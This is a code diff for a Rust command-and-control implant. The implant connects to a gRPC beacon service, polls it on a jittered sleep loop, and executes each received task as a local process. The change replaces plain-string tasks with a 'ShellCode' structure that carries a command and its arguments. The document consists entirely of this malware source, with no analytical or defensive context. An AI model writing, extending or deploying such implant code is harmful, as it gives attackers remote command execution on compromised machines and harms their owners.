@@ -5,8 +5,13 @@ use tokio::{process::Command, time};
 use tonic::transport::Channel;
 
 use tasks::{beacon_service_client::BeaconServiceClient, ConnectionRequest, PollRequest};
+use common::ShellCode;
+
 pub mod tasks {
     tonic::include_proto!("tasks");
+}
+pub mod common {
+    tonic::include_proto!("common");
 }
 
 struct Implant {
@@ -31,7 +36,7 @@ impl Implant {
         })
     }
 
-    pub async fn poll(&mut self) -> Result<Option<String>, Box<dyn std::error::Error>> {
+    pub async fn poll(&mut self) -> Result<Option<ShellCode>, Box<dyn std::error::Error>> {
         let response = self
             .client
             .poll(tonic::Request::new(PollRequest {
@@ -52,8 +57,8 @@ impl Implant {
             as u64
     }
 
-    pub async fn cmd(task: String) -> Result<(), Box<dyn std::error::Error>> {
-        let output = Command::new(task).output().await?;
+    pub async fn cmd(task: ShellCode) -> Result<(), Box<dyn std::error::Error>> {
+        let output = Command::new(task.command).output().await?;
         println!("Out: {}", String::from_utf8_lossy(&output.stdout));
         Ok(())
     }
@@ -67,7 +72,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         time::sleep(Duration::from_millis(implant.jitter())).await;
 
         if let Some(s) = implant.poll().await.expect("Fail") {
-            println!("Shellcode: {s}");
+            println!("Shellcode: {} {:?}", s.command, s.arguments);
             Implant::cmd(s).await?;
         }
     }
